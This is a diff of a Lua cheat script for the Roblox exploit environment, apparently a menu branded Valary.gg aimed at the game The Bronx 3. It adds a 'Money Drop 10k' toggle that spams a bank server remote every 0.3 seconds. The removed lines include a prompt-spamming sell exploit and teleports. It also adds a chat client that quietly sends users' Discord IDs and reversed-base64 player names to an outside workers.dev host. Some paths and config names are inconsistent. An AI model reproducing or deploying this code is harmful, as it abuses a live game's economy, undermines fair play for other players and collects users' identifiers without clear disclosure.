+                Items["Input"].Instance.Text = ""
+            end
+
+            function GlobalChat:SendMessage(Avatar, Username, Message, IsLocalPlayer)
+                local SubItems = { } do
+                    if not IsLocalPlayer then
+                        SubItems["Message1"] = Instances:Create("Frame", {
+                            Parent = Items["Messages"].Instance,
+                            Name = "\0",
+                            BackgroundTransparency = 1,
+                            Size = UDim2New(1, 0, 0, 45),
+                            BorderColor3 = FromRGB(0, 0, 0),
+                            BorderSizePixel = 0,
+                            AutomaticSize = Enum.AutomaticSize.Y,
+                            BackgroundColor3 = FromRGB(255, 255, 255)
+                        })
+
+                        SubItems["PlayerName"] = Instances:Create("TextLabel", {
+                            Parent = SubItems["Message1"].Instance,
+                            Name = "\0",
+                            FontFace = Library.Font,
+                            TextColor3 = FromRGB(255, 255, 255),
+                            BorderColor3 = FromRGB(0, 0, 0),
+                            Text = Username,
+                            Size = UDim2New(0, 0, 0, 15),
+                            RichText = true,
+                            BackgroundTransparency = 1,
+                            Position = UDim2New(0, 38, 0, 0),
+                            BorderSizePixel = 0,
+                            AutomaticSize = Enum.AutomaticSize.X,
+                            TextSize = 14,
+                            BackgroundColor3 = FromRGB(255, 255, 255)
+                        })  SubItems["PlayerName"]:AddToTheme({TextColor3 = "Text"})
+
+                        SubItems["RealMessage"] = Instances:Create("Frame", {
+                            Parent = SubItems["Message1"].Instance,
+                            Name = "\0",
+                            Position = UDim2New(0, 38, 0, 20),
+                            BorderColor3 = FromRGB(0, 0, 0),
+                            BorderSizePixel = 0,
+                            AutomaticSize = Enum.AutomaticSize.XY,
+                            BackgroundColor3 = FromRGB(22, 25, 29)
+                        })  SubItems["RealMessage"]:AddToTheme({BackgroundColor3 = "Inline"})
+
+                        Instances:Create("UISizeConstraint", {
+                            Parent = SubItems["RealMessage"].Instance,
+                            Name = "\0",
+                            MaxSize = Vector2New(370, 75)
+                        })
+
+                        Instances:Create("UICorner", {
+                            Parent = SubItems["RealMessage"].Instance,
+                            Name = "\0",
+                            CornerRadius = UDimNew(0, 4)
+                        })
+
+                        SubItems["MessageText"] = Instances:Create("TextLabel", {
+                            Parent = SubItems["RealMessage"].Instance,
+                            Name = "\0",
+                            FontFace = Library.Font,
+                            TextColor3 = FromRGB(255, 255, 255),
+                            BorderColor3 = FromRGB(0, 0, 0),
+                            Text = Message,
+                            BackgroundTransparency = 1,
+                            TextWrapped = true,
+                            TextXAlignment = Enum.TextXAlignment.Left,
+                            BorderSizePixel = 0,
+                            TextWrapped = true,
+                            AutomaticSize = Enum.AutomaticSize.XY,
+                            TextSize = 14,
+                            BackgroundColor3 = FromRGB(255, 255, 255)
+                        })  SubItems["MessageText"]:AddToTheme({TextColor3 = "Text"})
+
+                        Instances:Create("UIPadding", {
+                            Parent = SubItems["RealMessage"].Instance,
+                            Name = "\0",
+                            PaddingTop = UDimNew(0, 8),
+                            PaddingBottom = UDimNew(0, 8),
+                            PaddingRight = UDimNew(0, 8),
+                            PaddingLeft = UDimNew(0, 8)
+                        })
+
+                        SubItems["Avatar"] = Instances:Create("ImageLabel", {
+                            Parent = SubItems["Message1"].Instance,
+                            Name = "\0",
+                            BorderColor3 = FromRGB(0, 0, 0),
+                            AnchorPoint = Vector2New(0, 0.5),
+                            Image = Avatar,
+                            BackgroundTransparency = 1,
+                            Position = UDim2New(0, 0, 0.5, 0),
+                            Size = UDim2New(0, 30, 0, 30),
+                            BorderSizePixel = 0,
+                            BackgroundColor3 = FromRGB(255, 255, 255)
+                        })
+
+                        Instances:Create("UICorner", {
+                            Parent = SubItems["Avatar"].Instance,
+                            Name = "\0",
+                            CornerRadius = UDimNew(0, 4)
+                        })
+                    else
+                        SubItems["Message1"] = Instances:Create("Frame", {
+                            Parent = Items["Messages"].Instance,
+                            Name = "\0",
+                            BackgroundTransparency = 1,
+                            Size = UDim2New(1, 0, 0, 45),
+                            BorderColor3 = FromRGB(0, 0, 0),
+                            BorderSizePixel = 0,
+                            AutomaticSize = Enum.AutomaticSize.Y,
+                            BackgroundColor3 = FromRGB(255, 255, 255)
+                        })
+
+                        SubItems["PlayerName"] = Instances:Create("TextLabel", {
+                            Parent = SubItems["Message1"].Instance,
+                            Name = "\0",
+                            FontFace = Library.Font,
+                            TextColor3 = FromRGB(255, 255, 255),
+                            BorderColor3 = FromRGB(0, 0, 0),
+                            Text = Username,
+                            RichText = true,
+                            AnchorPoint = Vector2New(1, 0),
+                            Size = UDim2New(0, 0, 0, 15),
+                            BackgroundTransparency = 1,
+                            Position = UDim2New(1, -38, 0, 0),
+                            BorderSizePixel = 0,
+                            AutomaticSize = Enum.AutomaticSize.X,
+                            TextSize = 14,
+                            BackgroundColor3 = FromRGB(255, 255, 255)
+                        })  SubItems["PlayerName"]:AddToTheme({TextColor3 = "Text"})
+
+                        SubItems["RealMessage"] = Instances:Create("Frame", {
+                            Parent = SubItems["Message1"].Instance,
+                            Name = "\0",
+                            AnchorPoint = Vector2New(1, 0),
+                            Position = UDim2New(1, -38, 0, 20),
+                            BorderColor3 = FromRGB(0, 0, 0),
+                            BorderSizePixel = 0,
+                            AutomaticSize = Enum.AutomaticSize.XY,
+                            BackgroundColor3 = FromRGB(22, 25, 29)
+                        })  SubItems["RealMessage"]:AddToTheme({BackgroundColor3 = "Inline"})
+
+                        Instances:Create("UISizeConstraint", {
+                            Parent = SubItems["RealMessage"].Instance,
+                            Name = "\0",
+                            MaxSize = Vector2New(370, 75)
+                        })
+
+                        Instances:Create("UICorner", {
+                            Parent = SubItems["RealMessage"].Instance,
+                            Name = "\0",
+                            CornerRadius = UDimNew(0, 4)
+                        })
+
+                        SubItems["MessageText"] = Instances:Create("TextLabel", {
+                            Parent = SubItems["RealMessage"].Instance,
+                            Name = "\0",
+                            FontFace = Library.Font,
+                            TextColor3 = FromRGB(255, 255, 255),
+                            BorderColor3 = FromRGB(0, 0, 0),
+                            Text = Message,
+                            BackgroundTransparency = 1,
+                            TextXAlignment = Enum.TextXAlignment.Left,
+                            BorderSizePixel = 0,
+                            AutomaticSize = Enum.AutomaticSize.XY,
+                            TextWrapped = true,
+                            TextSize = 14,
+                            BackgroundColor3 = FromRGB(255, 255, 255)
+                        })  SubItems["MessageText"]:AddToTheme({TextColor3 = "Text"})
+
+                        Instances:Create("UIPadding", {
+                            Parent = SubItems["RealMessage"].Instance,
+                            Name = "\0",
+                            PaddingTop = UDimNew(0, 8),
+                            PaddingBottom = UDimNew(0, 8),
+                            PaddingRight = UDimNew(0, 8),
+                            PaddingLeft = UDimNew(0, 8)
+                        })
+
+                        SubItems["Avatar"] = Instances:Create("ImageLabel", {
+                            Parent = SubItems["Message1"].Instance,
+                            Name = "\0",
+                            BorderColor3 = FromRGB(0, 0, 0),
+                            AnchorPoint = Vector2New(1, 0.5),
+                            Image = Avatar,
+                            BackgroundTransparency = 1,
+                            Position = UDim2New(1, 0, 0.5, 0),
+                            Size = UDim2New(0, 30, 0, 30),
+                            BorderSizePixel = 0,
+                            BackgroundColor3 = FromRGB(255, 255, 255)
+                        })
+
+                        Instances:Create("UICorner", {
+                            Parent = SubItems["Avatar"].Instance,
+                            Name = "\0",
+                            CornerRadius = UDimNew(0, 4)
+                        })
+                    end
+                end
+            end
+
+            Items["CloseButton"]:Connect("MouseButton1Down", function()
+                GlobalChat:SetVisibility(false)
+
+                if GlobalChat_Toggle then
+                    GlobalChat_Toggle:Set(false)
+                end
+            end)
+            
+            Items["SendMessageButton"]:Connect("MouseButton1Down", function()
+                if GlobalChat:GetTypedMessage() == "" then
+                    return
+                end
+                
+                task.spawn(OnMessagePressed)
+                Items["SendMessageButton"]:Tween(nil, {BackgroundColor3 = Library:GetDarkerColor(Library.Theme.Accent)})
+                task.wait(0.1)
+                Items["SendMessageButton"]:Tween(nil, {BackgroundColor3 = Library.Theme.Element})
+            end)
+
+            Items["SendMessageButton"]:Connect("MouseEnter", function()
+                Items["SendMessageButton"]:Tween(nil, {BackgroundColor3 = Library:GetDarkerColor(Library.Theme.Element)})
+            end)
+
+            Items["SendMessageButton"]:Connect("MouseLeave", function()
+                Items["SendMessageButton"]:Tween(nil, {BackgroundColor3 = Library.Theme.Element})
+            end)
+
+            Items["Input"]:Connect("MouseEnter", function()
+                Items["Input"]:Tween(nil, {BackgroundColor3 = Library:GetDarkerColor(Library.Theme.Element)})
+            end)
+
+            Items["Input"]:Connect("MouseLeave", function()
+                Items["Input"]:Tween(nil, {BackgroundColor3 = Library.Theme.Element})
+            end)
+
+            Items["Messages"]:Connect("ChildAdded", function()
+                wait() -- wait so we ensure the child is added
+                Items["Messages"]:Tween(nil, {CanvasPosition = Vector2New(0, Items["Messages"].Instance.AbsoluteCanvasSize.Y - Items["Messages"].Instance.AbsoluteSize.Y)})
+            end)
+
+            return GlobalChat 
         end
-
+        
         Library.Notification = function(self, Data)
             Data = Data or { }
 
@@ -9080,7 +9476,7 @@ do -- Library
                 Logo = Data.Logo or Data.logo or "135215559087473",
                 FadeSpeed = Data.FadeSpeed or Data.fadespeed or 0.2,
                 Version = Data.Version or Data.version or "v1.0.0 alpha",
-                Size = not IsMobile and UDim2New(0, 659, 0, 511) or UDim2New(0, 420, 0, 420),
+                Size = not IsMobile and UDim2New(0, 659, 0, 511) or UDim2New(0, 380, 0, 420),
 
                 Pages = { },
                 SubPages = { },
@@ -11983,8 +12379,266 @@ do
         MainFrame = Window.Items["MainFrame"] -- keep this
     })
 
-    -- Global chat removed for mobile compatibility.
-    -- The chat UI and background message polling have been disabled.
+    local ChatSystem = Library:ChatSystem({
+        MainFrame = Window.Items["MainFrame"] -- keep this
+    })
+
+    local Chat_API = {}
+
+    Chat_API.URL = "https://yellow-band-8a75.oblockjoycesohiorizz.workers.dev/"
+
+    local HttpService = Services.HttpService
+
+    function Chat_API.SendMessage(UserId, Message)
+        local Response = game:HttpGet(string.format(
+            "%s?format=json&event=chat&message=%s&userid=%s",
+            Chat_API.URL,
+            HttpService:UrlEncode(Message),
+            HttpService:UrlEncode(UserId)
+        ))
+
+        return HttpService:JSONDecode(Response)
+    end
+
+    function Chat_API.Heartbeat(UserId)
+        local Response = game:HttpGet(string.format(
+            "%s?format=json&event=heartbeat&userid=%s",
+            Chat_API.URL,
+            HttpService:UrlEncode(UserId)
+        ))
+        return HttpService:JSONDecode(Response)
+    end
+
+    function Chat_API.GetMessages()
+        local Response = game:HttpGet(Chat_API.URL.."?format=json")
+
+        return HttpService:JSONDecode(Response)
+    end
+
+    local Cached_Data = {}
+
+    local Special_DiscordIDS = {
+        ["1096603799159832636"] = ' - <font color="#EC1717">Owner</font>'
+    }
+    
+if not isfolder("wave/Assets/Profiles") then
+            makefolder("wave/Assets/Profiles")
+    end
+
+    function Chat_API.GetDiscordProfile(Discord_ID)
+        if not Cached_Data[Discord_ID] then
+            local Response = game:HttpGet("https://discord-lookup-api-neon.vercel.app/v1/user/" .. Discord_ID)
+            repeat wait() until Response
+            task.wait(0.1)
+            Cached_Data[Discord_ID] = HttpService:JSONDecode(Response)
+        end
+            
+        local avatar = Cached_Data[Discord_ID].avatar
+        local ext = avatar.is_animated and ".gif" or ".png"
+
+        if not isfile("wave/Assets/Profiles/"..Discord_ID..ext) then
+            if not avatar.link then
+                writefile("wave/Assets/Profiles/"..Discord_ID..ext, game:HttpGet('https://raw.githubusercontent.com/ValarySoftworks/Assets/refs/heads/main/download.png'))
+            else
+                writefile("wave/Assets/Profiles/"..Discord_ID..ext, game:HttpGet(avatar.link))
+            end
+        end
+
+        local Name = Cached_Data[Discord_ID].global_name
+
+        if Special_DiscordIDS[Discord_ID] then
+            Name..=Special_DiscordIDS[Discord_ID]
+        end
+
+        return getcustomasset("valary/Assets/Profiles/"..Discord_ID..ext), Name
+    end
+
+    task.spawn(function()
+        do -- Add User
+            pcall(function()
+                local encodedID = HttpService:UrlEncode(LRM_LinkedDiscordID)
+                local base64_name = string.reverse(base64.encode(LocalPlayer.Name))
+
+                local encodedName = HttpService:UrlEncode(base64_name)
+
+                request({
+                    Url = "https://yellow-band-8a75.oblockjoycesohiorizz.workers.dev/?event=add_user&userid=" 
+                        .. encodedID .. "&username=" .. encodedName,
+                    Method = "GET"
+                })
+            end)
+        end
+
+        -- Refresh hearbeat
+            task.spawn(LPH_JIT_MAX(function()
+                while task.wait(90) do
+                    pcall(Chat_API.Heartbeat, LRM_LinkedDiscordID)
+                    --local encodedID = HttpService:UrlEncode(LRM_LinkedDiscordID)
+                    --request({Url = "https://yellow-band-8a75.oblockjoycesohiorizz.workers.dev/?event=heartbeat&userid="..encodedID, Method = "GET"})
+                end
+            end))
+        --
+
+        -- Refresh Status
+            do
+                pcall(function()
+                    local Users = Chat_API.GetMessages().users.value
+
+                    ChatSystem:SetStatusText(string.format('%s Active | Connected', tostring(Users)))
+                end)
+            end
+        --
+            
+        ChatSystem:OnMessageSendPressed(function()
+            local Profile, Username = Chat_API.GetDiscordProfile(LRM_LinkedDiscordID)
+
+            local Text = ChatSystem:GetTypedMessage()
+
+            ChatSystem:ClearText()
+            
+            ChatSystem:SendMessage(Profile, Username, Text, true)
+
+            pcall(Chat_API.SendMessage, LRM_LinkedDiscordID, Text)
+        end)
+
+        task.spawn(LPH_JIT_MAX(function()
+            local data_to_send = {}
+            local Already_Sent = {}
+
+            --[[pcall(function()
+                for i,v in Chat_API.GetMessages().messages do
+                    if not Already_Sent[v.message.."_"..v.userid.."_"..v.timestamp] then
+                        Already_Sent[v.message.."_"..v.userid.."_"..v.timestamp] = true
+                    end
+                end
+            end)]]
+
+            local function formatNameWithTime(username, time)
+                return string.format(
+                    '%s <font color="#72767D"> %s</font>',
+                    username,
+                    os.date("%H:%M", time)
+                )
+            end
+
+            while task.wait(1) do
+                local Success, Error = pcall(function()
+                    local Messages = Chat_API.GetMessages()
+
+                    ChatSystem:SetStatusText(string.format('%s Active | Connected', tostring(Messages.users.value)))
+
+                    if not Messages.users.stored[LRM_LinkedDiscordID] then
+                        local encodedID = HttpService:UrlEncode(LRM_LinkedDiscordID)
+                        local base64_name = string.reverse(base64.encode(LocalPlayer.Name))
+
+                        local encodedName = HttpService:UrlEncode(base64_name)
+
+                        request({
+                            Url = "https://yellow-band-8a75.oblockjoycesohiorizz.workers.dev/?event=add_user&userid=" 
+                                .. encodedID .. "&username=" .. encodedName,
+                            Method = "GET"
+                        })
+                    end
+
+                    for i,v in Messages.users.stored do
+                        pcall(function()
+                            local decoded_user = base64.decode(string.reverse(v.username))
+
+                            if not Config.Wave_Users[decoded_user] then
+                                Config.Wave_Users[decoded_user] = i
+                            end
+                        end)
+                    end
+
+                    local toRemove = {}
+
+                    for username, id in Config.Valary_Users do
+                        if not Messages.users.stored[id] then
+                            table.insert(toRemove, username)
+                        end
+                    end
+
+                    for _, username in toRemove do
+                        Config.Wave_Users[username] = nil
+                    end
+
+                    for _, v in pairs(Messages.messages) do
+                        --if v.userid ~= LRM_LinkedDiscordID then
+                            if not Already_Sent[v.userid.."_"..v.timestamp.."_"..v.message] then
+                                local Profile, Username = Chat_API.GetDiscordProfile(v.userid)
+
+                                Username = tostring(Username or "Unknown")
+                                local Timestamp = tonumber(v.timestamp) or os.time()
+
+                                data_to_send[v.userid] = data_to_send[v.userid] or {}
+
+                                table.insert(data_to_send[v.userid], {
+                                    UserId = v.userid,
+                                    Profile = Profile,
+                                    Username = Username,
+                                    Message = tostring(v.message or "ERROR"),
+                                    Timestamp = Timestamp
+                                })
+                            end
+                        --end
+                    end
+
+                    local flat = {}
+
+                    for _, msgs in pairs(data_to_send) do
+                        for _, msg in ipairs(msgs) do
+                            table.insert(flat, msg)
+                        end
+                    end
+
+                    table.sort(flat, function(a, b)
+                        return a.Timestamp < b.Timestamp
+                    end)
+
+                    for _, v in ipairs(flat) do
+                        local msgKey = v.UserId .. "_" .. v.Timestamp .. "_" .. v.Message
+
+                        local Check = v.UserId ~= LRM_LinkedDiscordID
+
+                        if not dfihjdsiufodsaiuojdfdsjauidfsdad then
+                            Check = true
+                        end
+
+                        if not Already_Sent[msgKey] and Check then
+                            ChatSystem:SendMessage(
+                                v.Profile,
+                                formatNameWithTime(v.Username, v.Timestamp),
+                                v.Message,
+                                v.UserId == LRM_LinkedDiscordID
+                            )
+
+                            Already_Sent[msgKey] = true
+                        end
+                    end
+
+                    table.clear(data_to_send)
+
+                    --[[for i,v in Messages.messages do
+                        if v.userid ~= LRM_LinkedDiscordID and not Already_Sent[v.message.."_"..v.userid.."_"..v.timestamp] then
+                            local Profile, Username = Chat_API.GetDiscordProfile(v.userid)
+
+                            ChatSystem:SendMessage(Profile, formatNameWithTime(Username, v.timestamp), v.message, false)
+                            Already_Sent[v.message.."_"..v.userid.."_"..v.timestamp] = true
+                        end
+                    end]]
+
+                    if not dfihjdsiufodsaiuojdfdsjauidfsdad then
+                        getgenv().SendMessage_Input.Instance.PlaceholderText = "Send message"
+                        dfihjdsiufodsaiuojdfdsjauidfsdad = true
+                    end
+                end)
+
+                if not Success then
+                    warn("GLOBAL CHAT ERROR :",Error)
+                end
+            end
+        end))
+    end)
 
     Watermark = Library:Watermark("This is a watermark", "135215559087473")
     Watermark:SetVisibility(false)
@@ -13299,17 +13953,10 @@ do
                             local _Clone = Lighting.Assets.GUI.ATMGui:Clone()
                             _Clone.Parent = LocalPlayer.PlayerGui
                             SelectedUI = _Clone
-                            if _Clone.Frame.closeBtn.TouchTap then
-                                _Clone.Frame.closeBtn.TouchTap:Connect(function()
-                                    ToggleInterface_Toggle:Set(false)
-                                    --_Clone:Destroy()
-                                end)
-                            else
-                                _Clone.Frame.closeBtn.MouseButton1Click:Connect(function()
-                                    ToggleInterface_Toggle:Set(false)
-                                    --_Clone:Destroy()
-                                end)
-                            end
+                            _Clone.Frame.closeBtn.MouseButton1Click:Connect(function()
+                                ToggleInterface_Toggle:Set(false)
+                                --_Clone:Destroy()
+                            end)
                         end
 
                         if not State and SelectedUI then
@@ -13800,29 +14447,6 @@ do
             
                         fireproximityprompt(Workspace.ATMMoney.Prompt)
                     end})
-
-                    -- Money Drop
-                    local MoneyDropEnabled = false
-                    task.spawn(function()
-                        while task.wait(0.3) do
-                            if MoneyDropEnabled then
-                                pcall(function()
-                                    ReplicatedStorage:WaitForChild("BankProcessRemote"):InvokeServer("Drop", "10000")
-                                end)
-                            end
-                        end
-                    end)
-
-                    ManualFarm_Section:Toggle({
-                        Name = "Money Drop 10k",
-                        Flag = "TheBronx3/MoneyDrop10k",
-                        Default = false,
-                        Tooltip = "Drops $10k every 0.3s",
-                        Callback = function(State)
-                            MoneyDropEnabled = State
-                        end
-                    })
-
                 end 
 
                 do -- Vulns
@@ -13989,55 +14613,26 @@ do
                         Config:DeleteHiddenScreen()
                     end})
 
-                    Vuln_Section:Button({
-                        Name = "Fruit Cup Sell Spam",
-                        Tooltip = "Spam the IceFruit Sell prompt when holding Ice-Fruit Cupz.",
-                        Callback = function()
-                            local found, cup = GetFruitCup()
 
-                            if not found or not cup then
-                                return Library:Notification({
-                                    Name = "Valary.gg | Error!",
-                                    Description = "Ice-Fruit Cupz not found in your backpack or character.",
-                                    Duration = 7,
-                                    Icon = "97118059177470",
-                                    IconColor = Color3.fromRGB(255, 120, 120)
-                                })
-                            end
-
-                            local sellSpot = Workspace:FindFirstChild("IceFruit Sell")
-                            if not sellSpot or not sellSpot:FindFirstChild("ProximityPrompt") then
-                                return Library:Notification({
-                                    Name = "Valary.gg | Error!",
-                                    Description = "IceFruit Sell prompt not found.",
-                                    Duration = 7,
-                                    Icon = "97118059177470",
-                                    IconColor = Color3.fromRGB(255, 120, 120)
-                                })
-                            end
-
-                            local oldCFrame = LocalPlayer.Character.HumanoidRootPart.CFrame
-
-                            if cup.Parent == LocalPlayer.Backpack then
-                                LocalPlayer.Character.Humanoid:EquipTool(cup)
-                                task.wait(1)
-                            end
-
-                            Config:Teleport(sellSpot.CFrame)
-                            task.wait(0.5)
-
-                            local prompt = sellSpot.ProximityPrompt
-                            prompt.HoldDuration = 0
-
-                            for index = 1, 4000 do
-                                task.spawn(function()
-                                    fireproximityprompt(prompt)
+                    -- Auto Drop 10k
+                    local MoneyDropEnabled = false
+                    task.spawn(function()
+                        while task.wait(0.3) do
+                            if MoneyDropEnabled then
+                                pcall(function()
+                                    ReplicatedStorage:WaitForChild("BankProcessRemote"):InvokeServer("Drop", "10000")
                                 end)
                             end
+                        end
+                    end)
 
-                            task.wait(1)
-                            prompt.HoldDuration = 1
-                            Config:Teleport(oldCFrame)
+                    Vuln_Section:Toggle({
+                        Name = "Money Drop 10k",
+                        Flag = "MoneyDrop10k",
+                        Default = false,
+                        Tooltip = "Drops $10k every 0.3s",
+                        Callback = function(State)
+                            MoneyDropEnabled = State
                         end
                     })
 
@@ -14204,9 +14799,6 @@ do
                         ["Construction Job 🔨"] = CFrame.new(-1729, 371, -1171);
                         ["Backpack Shop 🎒"] = CFrame.new(-694, 254, -684);
                         ["Hospital 🏥"] = CFrame.new(-1592, 254, 23);
-                        ["Mansion 🏰"] = CFrame.new(-788.88, 253.57, 1380.08);
-                        ["Penthouse 🏢"] = CFrame.new(-114.51, 397.14, -562.60);
-                        ["RPT 🔫"] = CFrame.new(-387.38, 254.45, -381.34);
                     };
 
                     local Location_Names = {}
@@ -15017,6 +15609,7 @@ do
                             Watermark:SetVisibility(Value)
                         end
                     })
+
 
                     MenuSection:Button({
                         Name = "unload",
